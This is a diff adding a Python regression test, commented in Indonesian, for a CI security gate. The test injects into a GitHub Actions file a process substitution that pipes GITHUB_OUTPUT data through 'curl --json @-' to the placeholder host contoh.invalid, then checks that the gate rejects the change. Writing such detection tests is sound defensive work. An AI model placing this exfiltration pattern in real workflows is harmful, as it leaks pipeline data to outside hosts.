@@ -21723,6 +21723,27 @@ def main():
                         [sys.executable, GERBANG, "--semua"])
         periksa("-I cpio berkas arsip sekelas -F: gerbang lolos (Audit 1879)", rc == 0)
         shutil.rmtree(sub1017, ignore_errors=True)
+        sub1018 = klon(tmp, "sub1018")
+        berkas_aksi1018 = os.path.join(
+            sub1018, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1018, encoding="utf-8") as f:
+            isi_aksi1018 = f.read()
+        baris_aksi1018 = [b for b in isi_aksi1018.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1018 = isi_aksi1018.replace(
+                baris_aksi1018,
+                baris_aksi1018.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --json @- https://contoh.invalid; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1018 != isi_aksi1018, \
+            "suntikan aksi1018 tidak menembak"
+        with open(berkas_aksi1018, "w", encoding="utf-8") as f:
+            f.write(isi_baru1018)
+        rc, out = jalan(sub1018,
+                        [sys.executable, GERBANG, "--semua"])
+        periksa("--json curl opsi data - @- dari stdin: gerbang gagal (Audit 1880)", rc != 0)
+        shutil.rmtree(sub1018, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
